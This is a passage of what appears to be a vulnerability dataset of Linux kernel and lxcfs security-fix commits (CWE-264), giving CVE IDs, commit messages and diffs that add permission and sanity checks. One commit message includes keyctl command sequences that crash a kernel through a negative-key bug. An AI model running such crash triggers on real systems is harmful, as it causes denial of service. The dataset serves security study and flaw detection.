b\/virt\/kvm\/assigned-dev.c\n@@ -17,6 +17,8 @@\n #include <linux\/pci.h>\n #include <linux\/interrupt.h>\n #include <linux\/slab.h>\n+#include <linux\/namei.h>\n+#include <linux\/fs.h>\n #include \"irq.h\"\n \n static struct kvm_assigned_dev_kernel *kvm_find_assigned_dev(struct list_head *head,\n@@ -474,12 +476,73 @@ static int kvm_vm_ioctl_deassign_dev_irq(struct kvm *kvm,\n \treturn r;\n }\n \n+\/*\n+ * We want to test whether the caller has been granted permissions to\n+ * use this device.  To be able to configure and control the device,\n+ * the user needs access to PCI configuration space and BAR resources.\n+ * These are accessed through PCI sysfs.  PCI config space is often\n+ * passed to the process calling this ioctl via file descriptor, so we\n+ * can't rely on access to that file.  We can check for permissions\n+ * on each of the BAR resource files, which is a pretty clear\n+ * indicator that the user has been granted access to the device.\n+ *\/\n+static int probe_sysfs_permissions(struct pci_dev *dev)\n+{\n+#ifdef CONFIG_SYSFS\n+\tint i;\n+\tbool bar_found = false;\n+\n+\tfor (i = PCI_STD_RESOURCES; i <= PCI_STD_RESOURCE_END; i++) {\n+\t\tchar *kpath, *syspath;\n+\t\tstruct path path;\n+\t\tstruct inode *inode;\n+\t\tint r;\n+\n+\t\tif (!pci_resource_len(dev, i))\n+\t\t\tcontinue;\n+\n+\t\tkpath = kobject_get_path(&dev->dev.kobj, GFP_KERNEL);\n+\t\tif (!kpath)\n+\t\t\treturn -ENOMEM;\n+\n+\t\t\/* Per sysfs-rules, sysfs is always at \/sys *\/\n+\t\tsyspath = kasprintf(GFP_KERNEL, \"\/sys%s\/resource%d\", kpath, i);\n+\t\tkfree(kpath);\n+\t\tif (!syspath)\n+\t\t\treturn -ENOMEM;\n+\n+\t\tr = kern_path(syspath, LOOKUP_FOLLOW, &path);\n+\t\tkfree(syspath);\n+\t\tif (r)\n+\t\t\treturn r;\n+\n+\t\tinode = path.dentry->d_inode;\n+\n+\t\tr = inode_permission(inode, MAY_READ | MAY_WRITE | MAY_ACCESS);\n+\t\tpath_put(&path);\n+\t\tif (r)\n+\t\t\treturn r;\n+\n+\t\tbar_found = true;\n+\t}\n+\n+\t\/* If no resources, probably something special *\/\n+\tif (!bar_found)\n+\t\treturn -EPERM;\n+\n+\treturn 0;\n+#else\n+\treturn -EINVAL; \/* No way to control the device without sysfs *\/\n+#endif\n+}\n+\n static int kvm_vm_ioctl_assign_device(struct kvm *kvm,\n \t\t\t\t      struct kvm_assigned_pci_dev *assigned_dev)\n {\n \tint r = 0, idx;\n \tstruct kvm_assigned_dev_kernel *match;\n \tstruct pci_dev *dev;\n+\tu8 header_type;\n \n \tif (!(assigned_dev->flags & KVM_DEV_ASSIGN_ENABLE_IOMMU))\n \t\treturn -EINVAL;\n@@ -510,6 +573,18 @@ static int kvm_vm_ioctl_assign_device(struct kvm *kvm,\n \t\tr = -EINVAL;\n \t\tgoto out_free;\n \t}\n+\n+\t\/* Don't allow bridges to be assigned *\/\n+\tpci_read_config_byte(dev, PCI_HEADER_TYPE, &header_type);\n+\tif ((header_type & PCI_HEADER_TYPE) != PCI_HEADER_TYPE_NORMAL) {\n+\t\tr = -EPERM;\n+\t\tgoto out_put;\n+\t}\n+\n+\tr = probe_sysfs_permissions(dev);\n+\tif (r)\n+\t\tgoto out_put;\n+\n \tif (pci_enable_device(dev)) {\n \t\tprintk(KERN_INFO \"%s: Could not enable PCI device\\n\", __func__);\n \t\tr = -EBUSY;\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2011-4127","CWE_ID":"264","category":"security","commit_id":"0bfc96cb77224736dfa35c3c555d37b3646ef35e","commit_message":"From 0bfc96cb77224736dfa35c3c555d37b3646ef35e Mon Sep 17 00:00:00 2001\nFrom: Paolo Bonzini <pbonzini@redhat.com>\nDate: Thu, 12 Jan 2012 16:01:28 +0100\nSubject: block: fail SCSI passthrough ioctls on partition devices\n\nLinux allows executing the SG_IO ioctl on a partition or LVM volume, and\nwill pass the command to the underlying block device.  This is\nwell-known, but it is also a large security problem when (via Unix\npermissions, ACLs, SELinux or a combination thereof) a program or user\nneeds to be granted access only to part of the disk.\n\nThis patch lets partitions forward a small set of harmless ioctls;\nothers are logged with printk so that we can see which ioctls are\nactually sent.  In my tests only CDROM_GET_CAPABILITY actually occurred.\nOf course it was being sent to a (partition on a) hard disk, so it would\nhave failed with ENOTTY and the patch isn't changing anything in\npractice.  Still, I'm treating it specially to avoid spamming the logs.\n\nIn principle, this restriction should include programs running with\nCAP_SYS_RAWIO.  If for example I let a program access \/dev\/sda2 and\n\/dev\/sdb, it still should not be able to read\/write outside the\nboundaries of \/dev\/sda2 independent of the capabilities.  However, for\nnow programs with CAP_SYS_RAWIO will still be allowed to send the\nioctls.  Their actions will still be logged.\n\nThis patch does not affect the non-libata IDE driver.  That driver\nhowever already tests for bd != bd->bd_contains before issuing some\nioctl; it could be restricted further to forbid these ioctls even for\nprograms running with CAP_SYS_ADMIN\/CAP_SYS_RAWIO.\n\nCc: linux-scsi@vger.kernel.org\nCc: Jens Axboe <axboe@kernel.dk>\nCc: James Bottomley <JBottomley@parallels.com>\nSigned-off-by: Paolo Bonzini <pbonzini@redhat.com>\n[ Make it also print the command name when warning - Linus ]\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>\n---\n block\/scsi_ioctl.c     | 45 +++++++++++++++++++++++++++++++++++++++++++++\n drivers\/scsi\/sd.c      | 11 +++++++++--\n include\/linux\/blkdev.h |  1 +\n 3 files changed, 55 insertions(+), 2 deletions(-)\n\n","diff_code":"diff --git a\/block\/scsi_ioctl.c b\/block\/scsi_ioctl.c\nindex a2c11f330872..260fa80ef575 100644\n--- a\/block\/scsi_ioctl.c\n+++ b\/block\/scsi_ioctl.c\n@@ -24,6 +24,7 @@\n #include <linux\/capability.h>\n #include <linux\/completion.h>\n #include <linux\/cdrom.h>\n+#include <linux\/ratelimit.h>\n #include <linux\/slab.h>\n #include <linux\/times.h>\n #include <asm\/uaccess.h>\n@@ -690,9 +691,53 @@ int scsi_cmd_ioctl(struct request_queue *q, struct gendisk *bd_disk, fmode_t mod\n }\n EXPORT_SYMBOL(scsi_cmd_ioctl);\n \n+int scsi_verify_blk_ioctl(struct block_device *bd, unsigned int cmd)\n+{\n+\tif (bd && bd == bd->bd_contains)\n+\t\treturn 0;\n+\n+\t\/* Actually none of these is particularly useful on a partition,\n+\t * but they are safe.\n+\t *\/\n+\tswitch (cmd) {\n+\tcase SCSI_IOCTL_GET_IDLUN:\n+\tcase SCSI_IOCTL_GET_BUS_NUMBER:\n+\tcase SCSI_IOCTL_GET_PCI:\n+\tcase SCSI_IOCTL_PROBE_HOST:\n+\tcase SG_GET_VERSION_NUM:\n+\tcase SG_SET_TIMEOUT:\n+\tcase SG_GET_TIMEOUT:\n+\tcase SG_GET_RESERVED_SIZE:\n+\tcase SG_SET_RESERVED_SIZE:\n+\tcase SG_EMULATED_HOST:\n+\t\treturn 0;\n+\tcase CDROM_GET_CAPABILITY:\n+\t\t\/* Keep this until we remove the printk below.  udev sends it\n+\t\t * and we do not want to spam dmesg about it.   CD-ROMs do\n+\t\t * not have partitions, so we get here only for disks.\n+\t\t *\/\n+\t\treturn -ENOIOCTLCMD;\n+\tdefault:\n+\t\tbreak;\n+\t}\n+\n+\t\/* In particular, rule out all resets and host-specific ioctls.  *\/\n+\tprintk_ratelimited(KERN_WARNING\n+\t\t\t   \"%s: sending ioctl %x to a partition!\\n\", current->comm, cmd);\n+\n+\treturn capable(CAP_SYS_RAWIO) ? 0 : -ENOIOCTLCMD;\n+}\n+EXPORT_SYMBOL(scsi_verify_blk_ioctl);\n+\n int scsi_cmd_blk_ioctl(struct block_device *bd, fmode_t mode,\n \t\t       unsigned int cmd, void __user *arg)\n {\n+\tint ret;\n+\n+\tret = scsi_verify_blk_ioctl(bd, cmd);\n+\tif (ret < 0)\n+\t\treturn ret;\n+\n \treturn scsi_cmd_ioctl(bd->bd_disk->queue, bd->bd_disk, mode, cmd, arg);\n }\n EXPORT_SYMBOL(scsi_cmd_blk_ioctl);\ndiff --git a\/drivers\/scsi\/sd.c b\/drivers\/scsi\/sd.c\nindex b4d57bb04c72..c691fb50e6cb 100644\n--- a\/drivers\/scsi\/sd.c\n+++ b\/drivers\/scsi\/sd.c\n@@ -1075,6 +1075,10 @@ static int sd_ioctl(struct block_device *bdev, fmode_t mode,\n \tSCSI_LOG_IOCTL(1, sd_printk(KERN_INFO, sdkp, \"sd_ioctl: disk=%s, \"\n \t\t\t\t    \"cmd=0x%x\\n\", disk->disk_name, cmd));\n \n+\terror = scsi_verify_blk_ioctl(bdev, cmd);\n+\tif (error < 0)\n+\t\treturn error;\n+\n \t\/*\n \t * If we are in the middle of error recovery, don't let anyone\n \t * else try and use this device.  Also, if error recovery fails, it\n@@ -1267,6 +1271,11 @@ static int sd_compat_ioctl(struct block_device *bdev, fmode_t mode,\n \t\t\t   unsigned int cmd, unsigned long arg)\n {\n \tstruct scsi_device *sdev = scsi_disk(bdev->bd_disk)->device;\n+\tint ret;\n+\n+\tret = scsi_verify_blk_ioctl(bdev, cmd);\n+\tif (ret < 0)\n+\t\treturn ret;\n \n \t\/*\n \t * If we are in the middle of error recovery, don't let anyone\n@@ -1278,8 +1287,6 @@ static int sd_compat_ioctl(struct block_device *bdev, fmode_t mode,\n \t\treturn -ENODEV;\n \t       \n \tif (sdev->host->hostt->compat_ioctl) {\n-\t\tint ret;\n-\n \t\tret = sdev->host->hostt->compat_ioctl(sdev, cmd, (void __user *)arg);\n \n \t\treturn ret;\ndiff --git a\/include\/linux\/blkdev.h b\/include\/linux\/blkdev.h\nindex ca7b869508c7..0ed1eb062313 100644\n--- a\/include\/linux\/blkdev.h\n+++ b\/include\/linux\/blkdev.h\n@@ -675,6 +675,7 @@ extern int blk_insert_cloned_request(struct request_queue *q,\n \t\t\t\t     struct request *rq);\n extern void blk_delay_queue(struct request_queue *, unsigned long);\n extern void blk_recount_segments(struct request_queue *, struct bio *);\n+extern int scsi_verify_blk_ioctl(struct block_device *, unsigned int);\n extern int scsi_cmd_blk_ioctl(struct block_device *, fmode_t,\n \t\t\t      unsigned int, void __user *);\n extern int scsi_cmd_ioctl(struct request_queue *, struct gendisk *, fmode_t,\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2017-10662","CWE_ID":"264","category":"security","commit_id":"b9dd46188edc2f0d1f37328637860bb65a771124","commit_message":"From b9dd46188edc2f0d1f37328637860bb65a771124 Mon Sep 17 00:00:00 2001\nFrom: Jin Qian <jinqian@google.com>\nDate: Tue, 25 Apr 2017 16:28:48 -0700\nSubject: [PATCH] f2fs: sanity check segment count\n\nF2FS uses 4 bytes to represent block address. As a result, supported\nsize of disk is 16 TB and it equals to 16 * 1024 * 1024 \/ 2 segments.\n\nSigned-off-by: Jin Qian <jinqian@google.com>\nSigned-off-by: Jaegeuk Kim <jaegeuk@kernel.org>\n---\n fs\/f2fs\/super.c         | 7 +++++++\n include\/linux\/f2fs_fs.h | 6 ++++++\n 2 files changed, 13 insertions(+)\n\n","diff_code":"diff --git a\/fs\/f2fs\/super.c b\/fs\/f2fs\/super.c\nindex 97c07a5153e96..4cd3bee6775f2 100644\n--- a\/fs\/f2fs\/super.c\n+++ b\/fs\/f2fs\/super.c\n@@ -1494,6 +1494,13 @@ static int sanity_check_raw_super(struct f2fs_sb_info *sbi,\n \t\treturn 1;\n \t}\n \n+\tif (le32_to_cpu(raw_super->segment_count) > F2FS_MAX_SEGMENT) {\n+\t\tf2fs_msg(sb, KERN_INFO,\n+\t\t\t\"Invalid segment count (%u)\",\n+\t\t\tle32_to_cpu(raw_super->segment_count));\n+\t\treturn 1;\n+\t}\n+\n \t\/* check CP\/SIT\/NAT\/SSA\/MAIN_AREA area boundary *\/\n \tif (sanity_check_area_boundary(sbi, bh))\n \t\treturn 1;\ndiff --git a\/include\/linux\/f2fs_fs.h b\/include\/linux\/f2fs_fs.h\nindex 639cbdf65e2bf..093549e10ee26 100644\n--- a\/include\/linux\/f2fs_fs.h\n+++ b\/include\/linux\/f2fs_fs.h\n@@ -301,6 +301,12 @@ struct f2fs_nat_block {\n #define SIT_VBLOCK_MAP_SIZE 64\n #define SIT_ENTRY_PER_BLOCK (PAGE_SIZE \/ sizeof(struct f2fs_sit_entry))\n \n+\/*\n+ * F2FS uses 4 bytes to represent block address. As a result, supported size of\n+ * disk is 16 TB and it equals to 16 * 1024 * 1024 \/ 2 segments.\n+ *\/\n+#define F2FS_MAX_SEGMENT       ((16 * 1024 * 1024) \/ 2)\n+\n \/*\n  * Note that f2fs_sit_entry->vblocks has the following bit-field information.\n  * [15:10] : allocation type such as CURSEG_XXXX_TYPE\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2015-8539","CWE_ID":"264","category":"security","commit_id":"096fe9eaea40a17e125569f9e657e34cdb6d73bd","commit_message":"From 096fe9eaea40a17e125569f9e657e34cdb6d73bd Mon Sep 17 00:00:00 2001\nFrom: David Howells <dhowells@redhat.com>\nDate: Tue, 24 Nov 2015 21:36:31 +0000\nSubject: KEYS: Fix handling of stored error in a negatively instantiated user\n key\n\nIf a user key gets negatively instantiated, an error code is cached in the\npayload area.  A negatively instantiated key may be then be positively\ninstantiated by updating it with valid data.  However, the ->update key\ntype method must be aware that the error code may be there.\n\nThe following may be used to trigger the bug in the user key type:\n\n    keyctl request2 user user \"\" @u\n    keyctl add user user \"a\" @u\n\nwhich manifests itself as:\n\n\tBUG: unable to handle kernel paging request at 00000000ffffff8a\n\tIP: [<ffffffff810a376f>] __call_rcu.constprop.76+0x1f\/0x280 kernel\/rcu\/tree.c:3046\n\tPGD 7cc30067 PUD 0\n\tOops: 0002 [#1] SMP\n\tModules linked in:\n\tCPU: 3 PID: 2644 Comm: a.out Not tainted 4.3.0+ #49\n\tHardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Bochs 01\/01\/2011\n\ttask: ffff88003ddea700 ti: ffff88003dd88000 task.ti: ffff88003dd88000\n\tRIP: 0010:[<ffffffff810a376f>]  [<ffffffff810a376f>] __call_rcu.constprop.76+0x1f\/0x280\n\t [<ffffffff810a376f>] __call_rcu.constprop.76+0x1f\/0x280 kernel\/rcu\/tree.c:3046\n\tRSP: 0018:ffff88003dd8bdb0  EFLAGS: 00010246\n\tRAX: 00000000ffffff82 RBX: 0000000000000000 RCX: 0000000000000001\n\tRDX: ffffffff81e3fe40 RSI: 0000000000000000 RDI: 00000000ffffff82\n\tRBP: ffff88003dd8bde0 R08: ffff88007d2d2da0 R09: 0000000000000000\n\tR10: 0000000000000000 R11: ffff88003e8073c0 R12: 00000000ffffff82\n\tR13: ffff88003dd8be68 R14: ffff88007d027600 R15: ffff88003ddea700\n\tFS:  0000000000b92880(0063) GS:ffff88007fd00000(0000) knlGS:0000000000000000\n\tCS:  0010 DS: 0000 ES: 0000 CR0: 000000008005003b\n\tCR2: 00000000ffffff8a CR3: 000000007cc5f000 CR4: 00000000000006e0\n\tStack:\n\t ffff88003dd8bdf0 ffffffff81160a8a 0000000000000000 00000000ffffff82\n\t ffff88003dd8be68 ffff88007d027600 ffff88003dd8bdf0 ffffffff810a39e5\n\t ffff88003dd8be20 ffffffff812a31ab ffff88007d027600 ffff88007d027620\n\tCall Trace:\n\t [<ffffffff810a39e5>] kfree_call_rcu+0x15\/0x20 kernel\/rcu\/tree.c:3136\n\t [<ffffffff812a31ab>] user_update+0x8b\/0xb0 security\/keys\/user_defined.c:129\n\t [<     inline     >] __key_update security\/keys\/key.c:730\n\t [<ffffffff8129e5c1>] key_create_or_update+0x291\/0x440 security\/keys\/key.c:908\n\t [<     inline     >] SYSC_add_key security\/keys\/keyctl.c:125\n\t [<ffffffff8129fc21>] SyS_add_key+0x101\/0x1e0 security\/keys\/keyctl.c:60\n\t [<ffffffff8185f617>] entry_SYSCALL_64_fastpath+0x12\/0x6a arch\/x86\/entry\/entry_64.S:185\n\nNote the error code (-ENOKEY) in EDX.\n\nA similar bug can be tripped by:\n\n    keyctl request2 trusted user \"\" @u\n    keyctl add trusted user \"a\" @u\n\nThis should also affect encrypted keys - but that has to be correctly\nparameterised or it will fail with EINVAL before getting to the bit that\nwill crashes.\n\nReported-by: Dmitry Vyukov <dvyukov@google.com>\nSigned-off-by: David Howells <dhowells@redhat.com>\nAcked-by: Mimi Zohar <zohar@linux.vnet.ibm.com>\nSigned-off-by: James Morris <james.l.morris@oracle.com>\n---\n security\/keys\/encrypted-keys\/encrypted.c | 2 ++\n security\/keys\/trusted.c                  | 5 ++++-\n security\/keys\/user_defined.c             | 5 ++++-\n 3 files changed, 10 insertions(+), 2 deletions(-)\n\n","diff_code":"diff --git a\/security\/keys\/encrypted-keys\/encrypted.c b\/security\/keys\/encrypted-keys\/encrypted.c\nindex 927db9f35ad6..696ccfa08d10 100644\n--- a\/security\/keys\/encrypted-keys\/encrypted.c\n+++ b\/security\/keys\/encrypted-keys\/encrypted.c\n@@ -845,6 +845,8 @@ static int encrypted_update(struct key *key, struct key_preparsed_payload *prep)\n \tsize_t datalen = prep->datalen;\n \tint ret = 0;\n \n+\tif (test_bit(KEY_FLAG_NEGATIVE, &key->flags))\n+\t\treturn -ENOKEY;\n \tif (datalen <= 0 || datalen > 32767 || !prep->data)\n \t\treturn -EINVAL;\n \ndiff --git a\/security\/keys\/trusted.c b\/security\/keys\/trusted.c\nindex 903dace648a1..16dec53184b6 100644\n--- a\/security\/keys\/trusted.c\n+++ b\/security\/keys\/trusted.c\n@@ -1007,13 +1007,16 @@ static void trusted_rcu_free(struct rcu_head *rcu)\n  *\/\n static int trusted_update(struct key *key, struct key_preparsed_payload *prep)\n {\n-\tstruct trusted_key_payload *p = key->payload.data[0];\n+\tstruct trusted_key_payload *p;\n \tstruct trusted_key_payload *new_p;\n \tstruct trusted_key_options *new_o;\n \tsize_t datalen = prep->datalen;\n \tchar *datablob;\n \tint ret = 0;\n \n+\tif (test_bit(KEY_FLAG_NEGATIVE, &key->flags))\n+\t\treturn -ENOKEY;\n+\tp = key->payload.data[0];\n \tif (!p->migratable)\n \t\treturn -EPERM;\n \tif (datalen <= 0 || datalen > 32767 || !prep->data)\ndiff --git a\/security\/keys\/user_defined.c b\/security\/keys\/user_defined.c\nindex 28cb30f80256..8705d79b2c6f 100644\n--- a\/security\/keys\/user_defined.c\n+++ b\/security\/keys\/user_defined.c\n@@ -120,7 +120,10 @@ int user_update(struct key *key, struct key_preparsed_payload *prep)\n \n \tif (ret == 0) {\n \t\t\/* attach the new data, displacing the old *\/\n-\t\tzap = key->payload.data[0];\n+\t\tif (!test_bit(KEY_FLAG_NEGATIVE, &key->flags))\n+\t\t\tzap = key->payload.data[0];\n+\t\telse\n+\t\t\tzap = NULL;\n \t\trcu_assign_keypointer(key, upayload);\n \t\tkey->expiry = 0;\n \t}\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2015-1344","CWE_ID":"264","category":"security","commit_id":"8ee2a503e102b1a43ec4d83113dc275ab20a869a","commit_message":"From 8ee2a503e102b1a43ec4d83113dc275ab20a869a Mon Sep 17 00:00:00 2001\nFrom: Serge Hallyn <serge.hallyn@ubuntu.com>\nDate: Fri, 13 Nov 2015 17:18:55 -0600\nSubject: [PATCH] Implement privilege check when moving tasks\n\nWhen writing pids to a tasks file in lxcfs, lxcfs was checking\nfor privilege over the tasks file but not over the pid being\nmoved.  Since the cgm_movepid request is done as root on the host,\nnot with the requestor's credentials, we must copy the check which\ncgmanager was doing to ensure that the requesting task is allowed\nto change the victim task's cgroup membership.\n\nThis is CVE-2015-1344\nhttps:\/\/bugs.launchpad.net\/ubuntu\/+source\/lxcfs\/+bug\/1512854\n\nSigned-off-by: Serge Hallyn <serge.hallyn@ubuntu.com>\n---\n lxcfs.c | 96 +++++++++++++++++++++++++++++++++++++++++++++++++++++++--\n 1 file changed, 94 insertions(+), 2 deletions(-)\n\n","diff_code":"diff --git a\/lxcfs.c b\/lxcfs.c\nindex 2c5aca4..5eb63c8 100644\n--- a\/lxcfs.c\n+++ b\/lxcfs.c\n@@ -1336,7 +1336,95 @@ static void pid_from_ns_wrapper(int sock, pid_t tpid)\n \tgoto loop;\n }\n \n-static bool do_write_pids(pid_t tpid, const char *contrl, const char *cg, const char *file, const char *buf)\n+\/*\n+ * Given host @uid, return the uid to which it maps in\n+ * @pid's user namespace, or -1 if none.\n+ *\/\n+bool hostuid_to_ns(uid_t uid, pid_t pid, uid_t *answer)\n+{\n+\tFILE *f;\n+\tchar line[400];\n+\n+\tsprintf(line, \"\/proc\/%d\/uid_map\", pid);\n+\tif ((f = fopen(line, \"r\")) == NULL) {\n+\t\treturn false;\n+\t}\n+\n+\t*answer = convert_id_to_ns(f, uid);\n+\tfclose(f);\n+\n+\tif (*answer == -1)\n+\t\treturn false;\n+\treturn true;\n+}\n+\n+\/*\n+ * get_pid_creds: get the real uid and gid of @pid from\n+ * \/proc\/$$\/status\n+ * (XXX should we use euid here?)\n+ *\/\n+void get_pid_creds(pid_t pid, uid_t *uid, gid_t *gid)\n+{\n+\tchar line[400];\n+\tuid_t u;\n+\tgid_t g;\n+\tFILE *f;\n+\n+\t*uid = -1;\n+\t*gid = -1;\n+\tsprintf(line, \"\/proc\/%d\/status\", pid);\n+\tif ((f = fopen(line, \"r\")) == NULL) {\n+\t\tfprintf(stderr, \"Error opening %s: %s\\n\", line, strerror(errno));\n+\t\treturn;\n+\t}\n+\twhile (fgets(line, 400, f)) {\n+\t\tif (strncmp(line, \"Uid:\", 4) == 0) {\n+\t\t\tif (sscanf(line+4, \"%u\", &u) != 1) {\n+\t\t\t\tfprintf(stderr, \"bad uid line for pid %u\\n\", pid);\n+\t\t\t\tfclose(f);\n+\t\t\t\treturn;\n+\t\t\t}\n+\t\t\t*uid = u;\n+\t\t} else if (strncmp(line, \"Gid:\", 4) == 0) {\n+\t\t\tif (sscanf(line+4, \"%u\", &g) != 1) {\n+\t\t\t\tfprintf(stderr, \"bad gid line for pid %u\\n\", pid);\n+\t\t\t\tfclose(f);\n+\t\t\t\treturn;\n+\t\t\t}\n+\t\t\t*gid = g;\n+\t\t}\n+\t}\n+\tfclose(f);\n+}\n+\n+\/*\n+ * May the requestor @r move victim @v to a new cgroup?\n+ * This is allowed if\n+ *   . they are the same task\n+ *   . they are ownedy by the same uid\n+ *   . @r is root on the host, or\n+ *   . @v's uid is mapped into @r's where @r is root.\n+ *\/\n+bool may_move_pid(pid_t r, uid_t r_uid, pid_t v)\n+{\n+\tuid_t v_uid, tmpuid;\n+\tgid_t v_gid;\n+\n+\tif (r == v)\n+\t\treturn true;\n+\tif (r_uid == 0)\n+\t\treturn true;\n+\tget_pid_creds(v, &v_uid, &v_gid);\n+\tif (r_uid == v_uid)\n+\t\treturn true;\n+\tif (hostuid_to_ns(r_uid, r, &tmpuid) && tmpuid == 0\n+\t\t\t&& hostuid_to_ns(v_uid, r, &tmpuid))\n+\t\treturn true;\n+\treturn false;\n+}\n+\n+static bool do_write_pids(pid_t tpid, uid_t tuid, const char *contrl, const char *cg,\n+\t\tconst char *file, const char *buf)\n {\n \tint sock[2] = {-1, -1};\n \tpid_t qpid, cpid = -1;\n@@ -1378,6 +1466,10 @@ static bool do_write_pids(pid_t tpid, const char *contrl, const char *cg, const\n \n \t\tif (recv_creds(sock[0], &cred, &v)) {\n \t\t\tif (v == '0') {\n+\t\t\t\tif (!may_move_pid(tpid, tuid, cred.pid)) {\n+\t\t\t\t\tfail = true;\n+\t\t\t\t\tbreak;\n+\t\t\t\t}\n \t\t\t\tif (fprintf(pids_file, \"%d\", (int) cred.pid) < 0)\n \t\t\t\t\tfail = true;\n \t\t\t}\n@@ -1450,7 +1542,7 @@ int cg_write(const char *path, const char *buf, size_t size, off_t offset,\n \t\t\tstrcmp(f->file, \"\/cgroup.procs\") == 0 ||\n \t\t\tstrcmp(f->file, \"cgroup.procs\") == 0)\n \t\t\/\/ special case - we have to translate the pids\n-\t\tr = do_write_pids(fc->pid, f->controller, f->cgroup, f->file, localbuf);\n+\t\tr = do_write_pids(fc->pid, fc->uid, f->controller, f->cgroup, f->file, localbuf);\n \telse\n \t\tr = cgfs_set_value(f->controller, f->cgroup, f->file, localbuf);\n \n","owner":"lxc","repo":"lxcfs","source":"cve"},{"CVE_ID":"CVE-2010-0291","CWE_ID":"264","category":"security","commit_id":"1a0ef85f84feb13f07b604fcf5b90ef7c2b5c82f","commit_message":"From 1a0ef85f84feb13f07b604fcf5b90ef7c2b5c82f Mon Sep 17 00:00:00 2001\nFrom: Al Viro <viro@zeniv.linux.org.uk>\nDate: Tue, 24 Nov 2009 07:43:18 -0500\nSubject: do_mremap() untangling, part 3\n\nTake the check for being able to expand vma in place into a separate\nhelper.\n\nAcked-by: Russell King <rmk+kernel@arm.linux.org.uk>\nAcked-by: Hugh Dickins <hugh.dickins@tiscali.co.uk>\nSigned-off-by: Al Viro <viro@zeniv.linux.org.uk>\n---\n mm\/mremap.c | 16 ++++++++++++----\n 1 file changed, 12 insertions(+), 4 deletions(-)\n\n","diff_code":"diff --git a\/mm\/mremap.c b\/mm\/mremap.c\nindex 5f346178f16f..90e422c9f410 100644\n--- a\/mm\/mremap.c\n+++ b\/mm\/mremap.c\n@@ -366,6 +366,17 @@ out:\n \treturn ret;\n }\n \n+static int vma_expandable(struct vm_area_struct *vma, unsigned long delta)\n+{\n+\tunsigned long max_addr = TASK_SIZE;\n+\tif (vma->vm_next)\n+\t\tmax_addr = vma->vm_next->vm_start;\n+\tif (max_addr - vma->vm_end < delta)\n+\t\treturn 0;\n+\t\/* we need to do arch-specific checks here *\/\n+\treturn 1;\n+}\n+\n \/*\n  * Expand (or shrink) an existing mapping, potentially moving it at the\n  * same time (controlled by the MREMAP_MAYMOVE flag and available VM space)\n@@ -430,11 +441,8 @@ unsigned long do_mremap(unsigned long addr,\n \t\/* old_len exactly to the end of the area..\n \t *\/\n \tif (old_len == vma->vm_end - addr) {\n-\t\tunsigned long max_addr = TASK_SIZE;\n-\t\tif (vma->vm_next)\n-\t\t\tmax_addr = vma->vm_next->vm_start;\n \t\t\/* can we just expand the current mapping? *\/\n-\t\tif (max_addr - addr >= new_len) {\n+\t\tif (vma_expandable(vma, new_len - old_len)) {\n \t\t\tint pages = (new_len - old_len) >> PAGE_SHIFT;\n \n \t\t\tvma_adjust(vma, vma->vm_start,\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2013-1858","CWE_ID":"264","category":"security","commit_id":"e66eded8309ebf679d3d3c1f5820d1f2ca332c71","commit_message":"From e66eded8309ebf679d3d3c1f5820d1f2ca332c71 Mon Sep 17 00:00:00 2001\nFrom: \"Eric W. Biederman\" <ebiederm@xmission.com>\nDate: Wed, 13 Mar 2013 11:51:49 -0700\nSubject: [PATCH] userns: Don't allow CLONE_NEWUSER | CLONE_FS\n\nDon't allowing sharing the root directory with processes in a\ndifferent user namespace.  There doesn't seem to be any point, and to\nallow it would require the overhead of putting a user namespace\nreference in fs_struct (for permission checks) and incrementing that\nreference count on practically every call to fork.\n\nSo just perform the inexpensive test of forbidding sharing fs_struct\nacrosss processes in different user namespaces.  We already disallow\nother forms of threading when unsharing a user namespace so this\nshould be no real burden in practice.\n\nThis updates setns, clone, and unshare to disallow multiple user\nnamespaces sharing an fs_struct.\n\nCc: stable@vger.kernel.org\nSigned-off-by: \"Eric W. Biederman\" <ebiederm@xmission.com>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>\n---\n kernel\/fork.c           | 5 ++++-\n kernel\/user_namespace.c | 4 ++++\n 2 files changed, 8 insertions(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/kernel\/fork.c b\/kernel\/fork.c\nindex 8d932b1c9056a..1766d324d5e35 100644\n--- a\/kernel\/fork.c\n+++ b\/kernel\/fork.c\n@@ -1141,6 +1141,9 @@ static struct task_struct *copy_process(unsigned long clone_flags,\n \tif ((clone_flags & (CLONE_NEWNS|CLONE_FS)) == (CLONE_NEWNS|CLONE_FS))\n \t\treturn ERR_PTR(-EINVAL);\n \n+\tif ((clone_flags & (CLONE_NEWUSER|CLONE_FS)) == (CLONE_NEWUSER|CLONE_FS))\n+\t\treturn ERR_PTR(-EINVAL);\n+\n \t\/*\n \t * Thread groups must share signals as well, and detached threads\n \t * can only be started up within the thread group.\n@@ -1807,7 +1810,7 @@ SYSCALL_DEFINE1(unshare, unsigned long, unshare_flags)\n \t * If unsharing a user namespace must also unshare the thread.\n \t *\/\n \tif (unshare_flags & CLONE_NEWUSER)\n-\t\tunshare_flags |= CLONE_THREAD;\n+\t\tunshare_flags |= CLONE_THREAD | CLONE_FS;\n \t\/*\n \t * If unsharing a pid namespace must also unshare the thread.\n \t *\/\ndiff --git a\/kernel\/user_namespace.c b\/kernel\/user_namespace.c\nindex 8b650837083e7..b14f4d3420439 100644\n--- a\/kernel\/user_namespace.c\n+++ b\/kernel\/user_namespace.c\n@@ -21,6 +21,7 @@\n #include <linux\/uaccess.h>\n #include <linux\/ctype.h>\n #include <linux\/projid.h>\n+#include <linux\/fs_struct.h>\n \n static struct kmem_cache *user_ns_cachep __read_mostly;\n \n@@ -837,6 +838,9 @@ static int userns_install(struct nsproxy *nsproxy, void *ns)\n \tif (atomic_read(&current->mm->mm_users) > 1)\n \t\treturn -EINVAL;\n \n+\tif (current->fs->users != 1)\n+\t\treturn -EINVAL;\n+\n \tif (!ns_capable(user_ns, CAP_SYS_ADMIN))\n \t\treturn -EPERM;\n 